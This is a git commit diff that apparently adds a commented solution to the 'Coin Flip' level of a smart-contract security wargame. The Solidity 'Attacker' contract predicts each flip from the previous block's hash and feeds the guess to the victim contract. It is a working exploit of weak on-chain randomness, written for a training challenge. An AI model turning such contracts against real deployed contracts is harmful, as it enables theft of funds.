48e76ff21af4649a6907398ed182d607fcb9be8f
Aryan Malik <aryanhunny98@gmail.com>
2023-08-13 23:16:28 +0530

    Coin_Flip accomplished

--- answers/4.Coin_Flip.sol
+++ answers/4.Coin_Flip.sol
@@ -1,38 +1,43 @@
+/*
+    This is the attack contract, and you gonna use this for the hack, all we need is the contract address of our victim contract, i.e CoinFlip's address
+*/
+
 // SPDX-License-Identifier: Unlicense
 
 pragma solidity ^0.8.0;
 
+// First create the interface of what our attacking contract looks like, tho you can also skip this step but need to import the contract file in this smart contract..
+// Anyways, creating the interface seems kind of professional!!
 interface ICoinFlip{
+    // this consecutiveWins() function is kind of optional, it is here just for checking the wins, better to just remove it if seeking less gas
     function consecutiveWins() external view returns (uint);
     function flip(bool) external returns (bool);
 }
 
 contract Attacker{
-    ICoinFlip public immutable coinflip;
+    // Create state variables to represent CoinFlip contract + FACTOR
+    ICoinFlip public coinflip;
     uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    uint count = 0;
-    uint lastHash;
 
-    constructor(){
-        coinflip = ICoinFlip(0x9D7f74d0C41E726EC95884E0e97Fa6129e3b5E99);
+    // Init the target CoinFlip address..
+
+    // We are not using "new" before CoinFlip because we want to
+    // interact with the existing contract, not any new instance of it
+    constructor(address _victimContract){
+        coinflip = ICoinFlip(_victimContract);
     }
 
+    // our attacking function which is using the flip functionality
     function attack() external {
-        while (count < 10){
-            uint blockValue = uint(blockhash(block.number - 1));
-            if (lastHash != blockValue){
-                lastHash = blockValue;
-                uint coinFlip = blockValue / FACTOR;
-                bool side = coinFlip == 1 ? true : false;
+        // Get blockhash of previous block, then convert to integer uint
+        uint blockValue = uint(blockhash(block.number - 1));
+        // Take blockvalue and divide it by the 'FACTOR' from the original contract
+        uint coinFlip = uint(blockValue / FACTOR);
+        // value is true if coinFlip value == 1 otherwise false
+        bool side = coinFlip == 1 ? true : false;
 
-                if (side == true){
-                    coinflip.flip(true);
-                } else {
-                    coinflip.flip(false);
-                }
-                count++;
-            }
-        }
+        // call flip and pass our guess!
+        coinflip.flip(side);
     }
 
     function ConsecutiveWins() external view returns (uint){
